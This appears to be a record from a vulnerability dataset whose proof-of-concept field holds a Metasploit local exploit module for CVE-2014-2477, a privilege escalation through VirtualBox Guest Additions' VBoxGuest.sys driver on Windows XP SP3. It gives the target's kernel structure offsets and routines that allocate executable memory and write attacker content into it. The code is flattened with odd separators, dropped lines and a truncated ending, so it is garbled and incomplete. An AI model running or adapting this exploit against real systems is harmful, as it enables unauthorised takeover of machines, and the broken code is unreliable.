{
    "text": "vul_name : VirtualBox Guest Additions VBoxGuest.sys Privilege Escalation ， vul_cve : CVE-2014-2477 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， require 'msf/core/exploit/local/windows_kernel' ， require 'rex' ， class Metasploit3 < Msf : Exploit : Local ， Rank = AverageRanking ， include Msf : Exploit : Local : WindowsKernel ， include Msf : Post : File ， include Msf : Post : Windows : FileInfo ， include Msf : Post : Windows : Priv ， include Msf : Post : Windows : Process ， super ( update_info ( info , { ， 'Name' => 'VirtualBox Guest Additions VBoxGuest.sys Privilege Escalation' ,  ， 'Description' => %q{ ， A vulnerability within the VBoxGuest driver allows an attacker to inject memory they ， control into an arbitrary location they define. This can be used by an attacker to ， overwrite HalDispatchTable+0x4 and execute arbitrary code by subsequently calling ， NtQueryIntervalProfile on Windows XP SP3 systems. This has been tested with VBoxGuest ， Additions up to 4.3.10r93012. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Matt Bergin <level [ at ] korelogic.com>' ,  # Vulnerability discovery and PoC ， 'Jay Smith <jsmith [ at ] korelogic.com>' # MSF module ，  ]  ,  ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'win' ,  ， 'SessionTypes' => [ 'meterpreter' ]  ,  ， 'DefaultOptions' => ， { ， 'EXITFUNC' => 'thread' ,  ， } ,  ， 'Targets' => ，  [  ，  [ 'Windows XP SP3' ,  ， { ， 'HaliQuerySystemInfo' => 0x16bba ,  ， '_KPROCESS' => \"\\x44\" ,  ， '_TOKEN' => \"\\xc8\" ,  ， '_UPID' => \"\\x84\" ,  ， '_APLINKS' => \"\\x88\" ， } ，  ]  ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2014-2477' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate'=> 'Jul 15 2014' ,  ， 'DefaultTarget' => 0 ， } )  ， end ， session.railgun.ntdll.NtAllocateVirtualMemory ( -1 ,  [ address ] .pack ( \"L\" )  , nil ,  [ length ] .pack ( \"L\" )  , \"MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN\" , \"PAGE_EXECUTE_READWRITE\" )  ， vprint_error ( \"Failed to allocate memory\" )  ， vprint_good ( \" # {address} is now writable\" )  ， end ， result = proc.memory.write ( address , content )  ， vprint_error ( \"Failed to write contents to memory\" )  ， vprint_good ( \"Contents successfully written to 0x # {address.to_s ( 16 ) }\" )  ， end ， end ， def check",
    "time": "2014.08.13"
}